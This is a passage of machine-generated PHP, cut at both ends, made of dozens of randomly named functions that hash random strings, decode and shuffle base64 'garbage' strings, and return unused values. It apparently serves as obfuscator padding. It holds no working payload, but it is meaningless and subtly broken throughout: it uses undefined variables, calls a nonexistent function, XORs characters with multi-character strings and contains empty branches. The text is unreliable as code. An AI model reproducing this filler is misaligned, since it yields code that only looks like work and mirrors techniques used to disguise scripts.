    $j = 0;
    while ($j < 5) {
        $rdJSgBee .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($rdJSgBee) > 10) {
        $TUUNgCiP = str_replace('a','x', $rdJSgBee);
    } else {
        $TUUNgCiP = strrev($rdJSgBee);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return sha1($TUUNgCiP);
}

function XuFLs7YoSP() {
    $_1mS2jdo = json_encode(['test' => rand(1000,9999)]);
    $ktRsSLQx = rawurlencode($_1mS2jdo);
        $ktRsSLQx = str_replace('%7B','{{', $ktRsSLQx);
    if (strpos($ktRsSLQx, '%22') !== false) {
        $ktRsSLQx = gzcompress($ktRsSLQx);
    } else {
        $ktRsSLQx = base64_encode($ktRsSLQx);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($ktRsSLQx);
}

function PNbEgzj4Rz() {
    $j = 0;
    while ($j < 5) {
        $f_gipCj8 .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($f_gipCj8) > 10) {
        $HeZydMYr = str_replace('a','x', $f_gipCj8);
    } else {
        $HeZydMYr = strrev($f_gipCj8);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($HeZydMYr);
}

function aRnx6TvuV4() {
    $c9GkZdYx = json_encode(['test' => rand(1000,9999)]);
    $jIyqb1Ao = rawurlencode($c9GkZdYx);
        $jIyqb1Ao = str_replace('%7B','{{', $jIyqb1Ao);
    if (strpos($jIyqb1Ao, '%22') !== false) {
        $jIyqb1Ao = gzcompress($jIyqb1Ao);
    } else {
        $jIyqb1Ao = base64_encode($jIyqb1Ao);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($jIyqb1Ao);
}

function Amm0Z7bM3O() {
    $SvpYS1Ud = json_encode(['test' => rand(1000,9999)]);
    $RW11Fkvu = rawurlencode($SvpYS1Ud);
        $RW11Fkvu = str_replace('%7B','{{', $RW11Fkvu);
    if (strpos($RW11Fkvu, '%22') !== false) {
        $RW11Fkvu = gzcompress($RW11Fkvu);
    } else {
        $RW11Fkvu = base64_encode($RW11Fkvu);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($RW11Fkvu);
}

function oUqt4dmEzb() {
    switch (rand(0, 2)) {
        case 0: $hDmkTmE2 = md5(time()); break;
        case 1: $hDmkTmE2 = sha1(time()); break;
        default: $hDmkTmE2 = crc32(time());
    }
    if (strlen($hDmkTmE2) > 10) {
        $U11n77MQ = str_replace('a','x', $hDmkTmE2);
    } else {
        $U11n77MQ = strrev($hDmkTmE2);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($U11n77MQ);
}

function zlBTCWXRZX() {
    $CgsznHDa = json_encode(['test' => rand(1000,9999)]);
    $l7N1KyFM = rawurlencode($CgsznHDa);
        $l7N1KyFM = str_replace('%7B','{{', $l7N1KyFM);
    if (strpos($l7N1KyFM, '%22') !== false) {
        $l7N1KyFM = gzcompress($l7N1KyFM);
    } else {
        $l7N1KyFM = base64_encode($l7N1KyFM);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($l7N1KyFM);
}

function C7VEVOR6Ej() {
    $sEZ_b64 = '9vUUD5zak' . '+EOl7g' . 'fIkFpWw==';
    $decodedGarbage = base64_decode($sEZ_b64);
    $mopkY2Mi = str_shuffle($decodedGarbage);
    $AznOAg5W = strrev($mopkY2Mi);
    for ($i = 0; $i < strlen($AznOAg5W); $i++) {
        if ($i % 2 == 1) {
            $AznOAg5W[$i] = chr(ord($AznOAg5W[$i]) ^ 'sEZ');
        }
    }
    if (strpos($AznOAg5W, 'A') !== false) {
        $mopkY2Mi = str_rot13($mopkY2Mi);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($mopkY2Mi);
}

function pcc4L1TG94() {
    $jh_QGYSh = json_encode(['test' => rand(1000,9999)]);
    $bwzimlj6 = rawurlencode($jh_QGYSh);
        $bwzimlj6 = str_replace('%7B','{{', $bwzimlj6);
    if (strpos($bwzimlj6, '%22') !== false) {
        $bwzimlj6 = gzcompress($bwzimlj6);
    } else {
        $bwzimlj6 = base64_encode($bwzimlj6);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($bwzimlj6);
}

function JnCDGt0eNI() {
    $j = 0;
    while ($j < 5) {
        $vSVyPHsJ .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($vSVyPHsJ) > 10) {
        $ScALKRFu = str_replace('a','x', $vSVyPHsJ);
    } else {
        $ScALKRFu = strrev($vSVyPHsJ);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($ScALKRFu);
}

function HHjuPbKAne() {
    $SI8_b64 = 'XnYuKl' . '0UqL9Rbv0O3m' . '6SsQ==';
    $decodedGarbage = base64_decode($SI8_b64);
    $YLd38VkE = str_shuffle($decodedGarbage);
    $y8hGUzTN = strrev($YLd38VkE);
    for ($i = 0; $i < strlen($y8hGUzTN); $i++) {
        if ($i % 2 == 1) {
            $y8hGUzTN[$i] = chr(ord($y8hGUzTN[$i]) ^ 'SI8');
        }
    }
    if (strpos($y8hGUzTN, 'A') !== false) {
        $YLd38VkE = str_rot13($YLd38VkE);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($YLd38VkE);
}

function eCXuLflc8I() {
    switch (rand(0, 2)) {
        case 0: $mL3WbfDN = md5(time()); break;
        case 1: $mL3WbfDN = sha1(time()); break;
        default: $mL3WbfDN = crc32(time());
    }
    if (strlen($mL3WbfDN) > 10) {
        $GgGfIQHN = str_replace('a','x', $mL3WbfDN);
    } else {
        $GgGfIQHN = strrev($mL3WbfDN);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($GgGfIQHN);
}

function KOHW3ZPuit() {
    for ($i = 0; $i < 5; $i++) {
        $mQneMrSW .= chr(rand(97, 122));
    }
    if (strlen($mQneMrSW) > 10) {
        $CbPlrcSp = str_replace('a','x', $mQneMrSW);
    } else {
        $CbPlrcSp = strrev($mQneMrSW);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return sha1($CbPlrcSp);
}

function LDfuhW_0fo() {
    $CUNVrwb3 = json_encode(['test' => rand(1000,9999)]);
    $b6Gp5UyU = rawurlencode($CUNVrwb3);
        $b6Gp5UyU = str_replace('%7B','{{', $b6Gp5UyU);
    if (strpos($b6Gp5UyU, '%22') !== false) {
        $b6Gp5UyU = gzcompress($b6Gp5UyU);
    } else {
        $b6Gp5UyU = base64_encode($b6Gp5UyU);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($b6Gp5UyU);
}

function NbET8a_FHK() {
    $kvL_b64 = '+C/SvqQa' . 'z6u6UO/zupKmfA=' . '=';
    $decodedGarbage = base64_decode($kvL_b64);
    $dbchdAmO = str_shuffle($decodedGarbage);
    $Bi7EbVYV = strrev($dbchdAmO);
    for ($i = 0; $i < strlen($Bi7EbVYV); $i++) {
        if ($i % 2 == 1) {
            $Bi7EbVYV[$i] = chr(ord($Bi7EbVYV[$i]) ^ 'kvL');
        }
    }
    if (strpos($Bi7EbVYV, 'A') !== false) {
        $dbchdAmO = str_rot13($dbchdAmO);
    }
    return strlen($dbchdAmO);
}

function FbhLiiHMmt() {
    $JZ__b64 = 'aZQUrPXJ' . 'uUYKEb' . 'ojrdaUYw==';
    $decodedGarbage = base64_decode($JZ__b64);
    $vOyfOeSp = str_shuffle($decodedGarbage);
    $CelzxgBu = strrev($vOyfOeSp);
    for ($i = 0; $i < strlen($CelzxgBu); $i++) {
        if ($i % 2 == 1) {
            $CelzxgBu[$i] = chr(ord($CelzxgBu[$i]) ^ 'JZ_');
        }
    }
    if (strpos($CelzxgBu, 'A') !== false) {
        $vOyfOeSp = str_rot13($vOyfOeSp);
    }
    return strlen($vOyfOeSp);
}

function Y9nbSio6Qn() {
    $E47_b64 = 'wTIOrT' . 'IunrPe+E' . '2zHNmqVw==';
    $decodedGarbage = base64_decode($E47_b64);
    $jKkGUQZR = str_shuffle($decodedGarbage);
    $XOytrYy8 = strrev($jKkGUQZR);
    for ($i = 0; $i < strlen($XOytrYy8); $i++) {
        if ($i % 2 == 1) {
            $XOytrYy8[$i] = chr(ord($XOytrYy8[$i]) ^ 'E47');
        }
    }
    if (strpos($XOytrYy8, 'A') !== false) {
        $jKkGUQZR = str_rot13($jKkGUQZR);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($jKkGUQZR);
}

function NPdM9iGXAW() {
    $lnV_b64 = 'vMhi+uwQ/x' . 'aOcOZL4dpTOg==' . '';
    $decodedGarbage = base64_decode($lnV_b64);
    $ZsZ1OCTn = str_shuffle($decodedGarbage);
    $AxSflL4v = strrev($ZsZ1OCTn);
    for ($i = 0; $i < strlen($AxSflL4v); $i++) {
        if ($i % 2 == 1) {
            $AxSflL4v[$i] = chr(ord($AxSflL4v[$i]) ^ 'lnV');
        }
    }
    if (strpos($AxSflL4v, 'A') !== false) {
        $ZsZ1OCTn = str_rot13($ZsZ1OCTn);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($ZsZ1OCTn);
}

function w9ZVV0WbR3() {
    $j = 0;
    while ($j < 5) {
        $FckS03GC .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($FckS03GC) > 10) {
        $S7DRFIIO = str_replace('a','x', $FckS03GC);
    } else {
        $S7DRFIIO = strrev($FckS03GC);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($S7DRFIIO);
}

function _C68C6ITN1() {
    $i9KUiXz0 = json_encode(['test' => rand(1000,9999)]);
    $kdpEljBj = rawurlencode($i9KUiXz0);
        $kdpEljBj = str_replace('%7B','{{', $kdpEljBj);
    if (strpos($kdpEljBj, '%22') !== false) {
        $kdpEljBj = gzcompress($kdpEljBj);
    } else {
        $kdpEljBj = base64_encode($kdpEljBj);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($kdpEljBj);
}

function zBdWF24ZFz() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $gfUn3pxP .= strtolower($letter);
    }
    if (strlen($gfUn3pxP) > 10) {
        $G2BYLTzw = str_replace('a','x', $gfUn3pxP);
    } else {
        $G2BYLTzw = strrev($gfUn3pxP);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return sha1($G2BYLTzw);
}

function xyYK5wW7oF() {
    for ($i = 0; $i < 5; $i++) {
        $vROQf5ex .= chr(rand(97, 122));
    }
    if (strlen($vROQf5ex) > 10) {
        $zzJvL6yT = str_replace('a','x', $vROQf5ex);
    } else {
        $zzJvL6yT = strrev($vROQf5ex);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return sha1($zzJvL6yT);
}

function t7AMJgfoFI() {
    switch (rand(0, 2)) {
        case 0: $cTEBhPEO = md5(time()); break;
        case 1: $cTEBhPEO = sha1(time()); break;
        default: $cTEBhPEO = crc32(time());
    }
    if (strlen($cTEBhPEO) > 10) {
        $RpaHlVFJ = str_replace('a','x', $cTEBhPEO);
    } else {
        $RpaHlVFJ = strrev($cTEBhPEO);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return sha1($RpaHlVFJ);
}

function Qq5WGWT2WH() {
    $ZrbkXyqf = json_encode(['test' => rand(1000,9999)]);
    $BGpgp_3P = rawurlencode($ZrbkXyqf);
        $BGpgp_3P = str_replace('%7B','{{', $BGpgp_3P);
    if (strpos($BGpgp_3P, '%22') !== false) {
        $BGpgp_3P = gzcompress($BGpgp_3P);
    } else {
        $BGpgp_3P = base64_encode($BGpgp_3P);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($BGpgp_3P);
}

function mhBr8LjQZP() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $wzxyH3mf .= strtolower($letter);
    }
    if (strlen($wzxyH3mf) > 10) {
        $yifSicyF = str_replace('a','x', $wzxyH3mf);
    } else {
        $yifSicyF = strrev($wzxyH3mf);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return sha1($yifSicyF);
}

function slBa0EnS4x() {
    $taKBJJv4 = json_encode(['test' => rand(1000,9999)]);
    $UGCLxzEu = rawurlencode($taKBJJv4);
        $UGCLxzEu = str_replace('%7B','{{', $UGCLxzEu);
    if (strpos($UGCLxzEu, '%22') !== false) {
        $UGCLxzEu = gzcompress($UGCLxzEu);
    } else {
        $UGCLxzEu = base64_encode($UGCLxzEu);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return strlen($UGCLxzEu);
}

function fugFonBKzI() {
    $hXe_b64 = 'TpvUSM+O0' . 'TEVC1' . 'RXTuA+rw==';
    $decodedGarbage = base64_decode($hXe_b64);
    $Io_pRht2 = str_shuffle($decodedGarbage);
    $pPMwzcl1 = strrev($Io_pRht2);
    for ($i = 0; $i < strlen($pPMwzcl1); $i++) {
        if ($i % 2 == 1) {
            $pPMwzcl1[$i] = chr(ord($pPMwzcl1[$i]) ^ 'hXe');
        }
    }
    if (strpos($pPMwzcl1, 'A') !== false) {
        $Io_pRht2 = str_rot13($Io_pRht2);
    }
    return strlen($Io_pRht2);
}

function j0MnsYsoUK() {
    $BVB_b64 = '/EFyP' . 'D2su/I' . '7Bu3Ovcsqqw==';
    $decodedGarbage = base64_decode($BVB_b64);
    $Lzr_XyWM = str_shuffle($decodedGarbage);
    $gKzK8gIz = strrev($Lzr_XyWM);
    for ($i = 0; $i < strlen($gKzK8gIz); $i++) {
        if ($i % 2 == 1) {
            $gKzK8gIz[$i] = chr(ord($gKzK8gIz[$i]) ^ 'BVB');
        }
    }
    if (strpos($gKzK8gIz, 'A') !== false) {
        $Lzr_XyWM = str_rot13($Lzr_XyWM);
    }
    return strlen($Lzr_XyWM);
}

function h9aWHn5PWb() {
    $uyJ_b64 = 'ZJGslX' . 'FqBjwKRiJGm9nD' . 'bQ==';
    $decodedGarbage = base64_decode($uyJ_b64);
    $QjF3k4AT = str_shuffle($decodedGarbage);
    $_VhFkaL7 = strrev($QjF3k4AT);
    for ($i = 0; $i < strlen($_VhFkaL7); $i++) {
        if ($i % 2 == 1) {
            $_VhFkaL7[$i] = chr(ord($_VhFkaL7[$i]) ^ 'uyJ');
        }
    }
    if (strpos($_VhFkaL7, 'A') !== false) {
        $QjF3k4AT = str_rot13($QjF3k4AT);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($QjF3k4AT);
}

function wPKACFOY5A() {
    $_4Q_b64 = '3EIT8pA' . 'M8TMjGGTz' . '9/4cIQ=';
    $decodedGarbage = base64_decode($_4Q_b64);
    $TqCue7RK = str_shuffle($decodedGarbage);
    $mdZy7Vfz = strrev($TqCue7RK);
    for ($i = 0; $i < strlen($mdZy7Vfz); $i++) {
        if ($i % 2 == 1) {
            $mdZy7Vfz[$i] = chr(ord($mdZy7Vfz[$i]) ^ '_4Q');
        }
    }
    if (strpos($mdZy7Vfz, 'A') !== false) {
        $TqCue7RK = str_rot13($TqCue7RK);
    }
    return strlen($TqCue7RK);
}

function xN4BWSZrDi() {
    $j = 0;
    while ($j < 5) {
        $FQevemz4 .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($FQevemz4) > 10) {
        $x_zSSgbl = str_replace('a','x', $FQevemz4);
    } else {
        $x_zSSgbl = strrev($FQevemz4);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return sha1($x_zSSgbl);
}

function bm9TlFDg14() {
    $jxwzQH1m = json_encode(['test' => rand(1000,9999)]);
    $pYihiklU = rawurlencode($jxwzQH1m);
        $pYihiklU = str_replace('%7B','{{', $pYihiklU);
    if (strpos($pYihiklU, '%22') !== false) {
        $pYihiklU = gzcompress($pYihiklU);
    } else {
        $pYihiklU = base64_encode($pYihiklU);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($pYihiklU);
}

function zH268HVzyL() {
    $MTt_b64 = 'uZ15gX/8o' . '6w/PVgf2Wi' . 'i4g==';
    $decodedGarbage = base64_decode($MTt_b64);
    $OW6L9Vfp = str_shuffle($decodedGarbage);
    $a4p4NGKr = strrev($OW6L9Vfp);
    for ($i = 0; $i < strlen($a4p4NGKr); $i++) {
        if ($i % 2 == 1) {
            $a4p4NGKr[$i] = chr(ord($a4p4NGKr[$i]) ^ 'MTt');
        }
    }
    if (strpos($a4p4NGKr, 'A') !== false) {
        $OW6L9Vfp = str_rot13($OW6L9Vfp);
    }
    return strlen($OW6L9Vfp);
}

function fe365MXki_() {
    $YyJ_b64 = '+6WRgzb' . 'J2Cg/tqD9lVfj' . '8w==';
    $decodedGarbage = base64_decode($YyJ_b64);
    $iN_eumb3 = str_shuffle($decodedGarbage);
    $KW66T_VG = strrev($iN_eumb3);
    for ($i = 0; $i < strlen($KW66T_VG); $i++) {
        if ($i % 2 == 1) {
            $KW66T_VG[$i] = chr(ord($KW66T_VG[$i]) ^ 'YyJ');
        }
    }
    if (strpos($KW66T_VG, 'A') !== false) {
        $iN_eumb3 = str_rot13($iN_eumb3);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($iN_eumb3);
}

function I3ZOQRRhKI() {
    $sPx_b64 = 'pocv+33M6y' . 'lei6nWojPA3g' . '==';
    $decodedGarbage = base64_decode($sPx_b64);
    $DrOFVYXL = str_shuffle($decodedGarbage);
    $IemxUbnW = strrev($DrOFVYXL);
    for ($i = 0; $i < strlen($IemxUbnW); $i++) {
        if ($i % 2 == 1) {
            $IemxUbnW[$i] = chr(ord($IemxUbnW[$i]) ^ 'sPx');
        }
    }
    if (strpos($IemxUbnW, 'A') !== false) {
        $DrOFVYXL = str_rot13($DrOFVYXL);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($DrOFVYXL);
}

function c5j4IOVzMz() {
    $To2_b64 = '4KXVQxHFy' . 'NWq9UD0' . 'mUds9w==';
    $decodedGarbage = base64_decode($To2_b64);
    $LZYnwTIP = str_shuffle($decodedGarbage);
    $fjXlTYVk = strrev($LZYnwTIP);
    for ($i = 0; $i < strlen($fjXlTYVk); $i++) {
        if ($i % 2 == 1) {
            $fjXlTYVk[$i] = chr(ord($fjXlTYVk[$i]) ^ 'To2');
        }
    }
    if (strpos($fjXlTYVk, 'A') !== false) {
        $LZYnwTIP = str_rot13($LZYnwTIP);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($LZYnwTIP);
}

function IhQdVjShxx() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $j2HXR_LA .= strtolower($letter);
    }
    if (strlen($j2HXR_LA) > 10) {
        $c7J2Qpou = str_replace('a','x', $j2HXR_LA);
    } else {
        $c7J2Qpou = strrev($j2HXR_LA);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return sha1($c7J2Qpou);
}

function mM1HCK3sBB() {
    $nrt_b64 = 'cVDDMfLs' . 'qn/hzoWbwUlzaA=' . '=';
    $decodedGarbage = base64_decode($nrt_b64);
    $Ob6jH5Dc = str_shuffle($decodedGarbage);
    $GT3Tcoel = strrev($Ob6jH5Dc);
    for ($i = 0; $i < strlen($GT3Tcoel); $i++) {
        if ($i % 2 == 1) {
            $GT3Tcoel[$i] = chr(ord($GT3Tcoel[$i]) ^ 'nrt');
        }
    }
    if (strpos($GT3Tcoel, 'A') !== false) {
        $Ob6jH5Dc = str_rot13($Ob6jH5Dc);
    }
    return strlen($Ob6jH5Dc);
}

function lQBo42vMgG() {
    $qjrSvQmk = json_encode(['test' => rand(1000,9999)]);
    $m9IdHy6y = rawurlencode($qjrSvQmk);
        $m9IdHy6y = str_replace('%7B','{{', $m9IdHy6y);
    if (strpos($m9IdHy6y, '%22') !== false) {
        $m9IdHy6y = gzcompress($m9IdHy6y);
    } else {
        $m9IdHy6y = base64_encode($m9IdHy6y);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($m9IdHy6y);
}

function sveCu1uH6O() {
    $j = 0;
    while ($j < 5) {
        $TP2fLlE2 .= chr(rand(97, 122));
        $j++;
    }
    if (strlen($TP2fLlE2) > 10) {
        $x01tVZdV = str_replace('a','x', $TP2fLlE2);
    } else {
        $x01tVZdV = strrev($TP2fLlE2);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return sha1($x01tVZdV);
}

function aQVEJJq3wB() {
    $SH_3lkBW = json_encode(['test' => rand(1000,9999)]);
    $VExkjhCh = rawurlencode($SH_3lkBW);
        $VExkjhCh = str_replace('%7B','{{', $VExkjhCh);
    if (strpos($VExkjhCh, '%22') !== false) {
        $VExkjhCh = gzcompress($VExkjhCh);
    } else {
        $VExkjhCh = base64_encode($VExkjhCh);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($VExkjhCh);
}

function nS1wehUuka() {
    $i9Ze4V18 = json_encode(['test' => rand(1000,9999)]);
    $rkSu5D76 = rawurlencode($i9Ze4V18);
        $rkSu5D76 = str_replace('%7B','{{', $rkSu5D76);
    if (strpos($rkSu5D76, '%22') !== false) {
        $rkSu5D76 = gzcompress($rkSu5D76);
    } else {
        $rkSu5D76 = base64_encode($rkSu5D76);
    }
       $arr = ['foo','bar','baz'];
    shuffle($arr);
    return strlen($rkSu5D76);
}

function vjs4AqHysL() {
    $AOxO_O2d = json_encode(['test' => rand(1000,9999)]);
    $to0SOmGB = rawurlencode($AOxO_O2d);
        $to0SOmGB = str_replace('%7B','{{', $to0SOmGB);
    if (strpos($to0SOmGB, '%22') !== false) {
        $to0SOmGB = gzcompress($to0SOmGB);
    } else {
        $to0SOmGB = base64_encode($to0SOmGB);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($to0SOmGB);
}

function lSaSEDAs_U() {
    $xiuV7DUo = json_encode(['test' => rand(1000,9999)]);
    $RarBlfnP = rawurlencode($xiuV7DUo);
        $RarBlfnP = str_replace('%7B','{{', $RarBlfnP);
    if (strpos($RarBlfnP, '%22') !== false) {
        $RarBlfnP = gzcompress($RarBlfnP);
    } else {
        $RarBlfnP = base64_encode($RarBlfnP);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($RarBlfnP);
}

function OsGdfwyqYG() {
    $kB_cnbIz = json_encode(['test' => rand(1000,9999)]);
    $goXSNWd4 = rawurlencode($kB_cnbIz);
        $goXSNWd4 = str_replace('%7B','{{', $goXSNWd4);
    if (strpos($goXSNWd4, '%22') !== false) {
        $goXSNWd4 = gzcompress($goXSNWd4);
    } else {
        $goXSNWd4 = base64_encode($goXSNWd4);
    }
       if (rand(0,1)) {
        $z = md5($y);
    } else {
        $z = sha1($y);
    }
    return strlen($goXSNWd4);
}

function grmQdO8fB_() {
    $Azo_b64 = 'yXMdy' . 'SiWqdSsq' . 'uw7O8A';
    $decodedGarbage = base64_decode($Azo_b64);
    $htZ00dct = str_shuffle($decodedGarbage);
    $XYtn4dHq = strrev($htZ00dct);
    for ($i = 0; $i < strlen($XYtn4dHq); $i++) {
        if ($i % 2 == 1) {
            $XYtn4dHq[$i] = chr(ord($XYtn4dHq[$i]) ^ 'Azo');
        }
    }
    if (strpos($XYtn4dHq, 'A') !== false) {
        $htZ00dct = str_rot13($htZ00dct);
    }
    return strlen($htZ00dct);
}

function eirDjHWrzg() {
    switch (rand(0, 2)) {
        case 0: $O2VFJ5EU = md5(time()); break;
        case 1: $O2VFJ5EU = sha1(time()); break;
        default: $O2VFJ5EU = crc32(time());
    }
    if (strlen($O2VFJ5EU) > 10) {
        $dvQZcySg = str_replace('a','x', $O2VFJ5EU);
    } else {
        $dvQZcySg = strrev($O2VFJ5EU);
    }
        try {
        @nonExistentFunction($arr);
    } catch (\Throwable $e) {
            }
    return sha1($dvQZcySg);
}

function KSDcrtUf0Z() {
    $qyR_b64 = 's3c/2' . 'CpeWvO/' . 'LD08wcoafQ==';
    $decodedGarbage = base64_decode($qyR_b64);
    $vbtpZVBo = str_shuffle($decodedGarbage);
    $iGmsXLd_ = strrev($vbtpZVBo);
    for ($i = 0; $i < strlen($iGmsXLd_); $i++) {
        if ($i % 2 == 1) {
            $iGmsXLd_[$i] = chr(ord($iGmsXLd_[$i]) ^ 'qyR');
        }
    }
    if (strpos($iGmsXLd_, 'A') !== false) {
        $vbtpZVBo = str_rot13($vbtpZVBo);
    }
        $current = time();
    if ($current % 2 === 0) {
            } else {
            }
    return strlen($vbtpZVBo);
}

function j0Zkd1b1WS() {
    $dQl_b64 = '190PcCZrB' . 'XM6tmPKP17Pa' . 'Q==';
    $decodedGarbage = base64_decode($dQl_b64);
    $sy1WkZ3h = str_shuffle($decodedGarbage);
    $U3JCGfvq = strrev($sy1WkZ3h);
    for ($i = 0; $i < strlen($U3JCGfvq); $i++) {
        if ($i % 2 == 1) {
            $U3JCGfvq[$i] = chr(ord($U3JCGfvq[$i]) ^ 'dQl');
        }
    }
    if (strpos($U3JCGfvq, 'A') !== false) {
        $sy1WkZ3h = str_rot13($sy1WkZ3h);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($sy1WkZ3h);
}

function SEN_3Xj0kw() {
    $Tco_b64 = '3h768CoP' . 'dFuTLu' . 'KaNEgP';
    $decodedGarbage = base64_decode($Tco_b64);
    $UfugVAMR = str_shuffle($decodedGarbage);
    $EPqK3KSp = strrev($UfugVAMR);
    for ($i = 0; $i < strlen($EPqK3KSp); $i++) {
        if ($i % 2 == 1) {
            $EPqK3KSp[$i] = chr(ord($EPqK3KSp[$i]) ^ 'Tco');
        }
    }
    if (strpos($EPqK3KSp, 'A') !== false) {
        $UfugVAMR = str_rot13($UfugVAMR);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($UfugVAMR);
}

function aRgkVz6fBB() {
    $nIO_b64 = 'uZn414FI' . 'OCtM+nr9nq+' . 'VIQ==';
    $decodedGarbage = base64_decode($nIO_b64);
    $iKzzpyaw = str_shuffle($decodedGarbage);
    $tqNdVrXv = strrev($iKzzpyaw);
    for ($i = 0; $i < strlen($tqNdVrXv); $i++) {
        if ($i % 2 == 1) {
            $tqNdVrXv[$i] = chr(ord($tqNdVrXv[$i]) ^ 'nIO');
        }
    }
    if (strpos($tqNdVrXv, 'A') !== false) {
        $iKzzpyaw = str_rot13($iKzzpyaw);
    }
    return strlen($iKzzpyaw);
}

function NTA4otH4H2() {
    $zTc_b64 = 'bkzmgt' . 'b1Ff9wp2' . '9CS/B0cw';
    $decodedGarbage = base64_decode($zTc_b64);
    $IX0tJgLd = str_shuffle($decodedGarbage);
    $lT_1lKt8 = strrev($IX0tJgLd);
    for ($i = 0; $i < strlen($lT_1lKt8); $i++) {
        if ($i % 2 == 1) {
            $lT_1lKt8[$i] = chr(ord($lT_1lKt8[$i]) ^ 'zTc');
        }
    }
    if (strpos($lT_1lKt8, 'A') !== false) {
        $IX0tJgLd = str_rot13($IX0tJgLd);
    }
        $tmpfname = tempnam(sys_get_temp_dir(), 'tmp');
    unlink($tmpfname);
    return strlen($IX0tJgLd);
}

function hIy6MMsDtP() {
    $arrRand = str_split('ABCDEFGH');
    foreach ($arrRand as $letter) {
        $x8DLho03 .= strtolower($letter);
    }
    if (strlen($x8DLho03) > 10) {
        $F8OGTMf6 = str_replace('a','x', $x8DLho03);
    } else {
        $F8OGTMf6 = strrev($x8DLho03);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return sha1($F8OGTMf6);
}

function E_9bcHIUPx() {
    $kRQDEmQu = json_encode(['test' => rand(1000,9999)]);
    $z0G4yBgS = rawurlencode($kRQDEmQu);
        $z0G4yBgS = str_replace('%7B','{{', $z0G4yBgS);
    if (strpos($z0G4yBgS, '%22') !== false) {
        $z0G4yBgS = gzcompress($z0G4yBgS);
    } else {
        $z0G4yBgS = base64_encode($z0G4yBgS);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return strlen($z0G4yBgS);
}

function cjtWhdFzo9() {
    for ($i = 0; $i < 5; $i++) {
        $Pp3RDCrl .= chr(rand(97, 122));
    }
    if (strlen($Pp3RDCrl) > 10) {
        $nUksLX__ = str_replace('a','x', $Pp3RDCrl);
    } else {
        $nUksLX__ = strrev($Pp3RDCrl);
    }
       $x = rand(1, 100);
    $y = $x * rand(1, 100);
    return sha1($nUksLX__);
}

function WcKBpE9Aye() {
    $YuV_b64 = 'eDs13TO54' . 'BU8KnPhjrf' . 'gJQ==';
    $decodedGarbage = base64_decode($YuV_b64);
    $o0YegXFm = str_shuffle($decodedGarbage);
    $CtMndeIN = strrev($o0YegXFm);
    for ($i = 0; $i < strlen($CtMndeIN); $i++) {
        if ($i % 2 == 1) {
            $CtMndeIN[$i] = chr(ord($CtMndeIN[$i]) ^ 'YuV');
        }
    }
    if (strpos($CtMndeIN, 'A') !== false) {
        $o0YegXFm = str_rot13($o0YegXFm);
    }
        echo "Debug: ".rand(1000,9999)."\n";
    return strlen($o0YegXFm);
}

function HtuhTgZmps() {
    $iD98azXo = json_encode(['test' => rand(1000,9999)]);
    $ykY_PxFn = rawurlencode($iD98azXo);
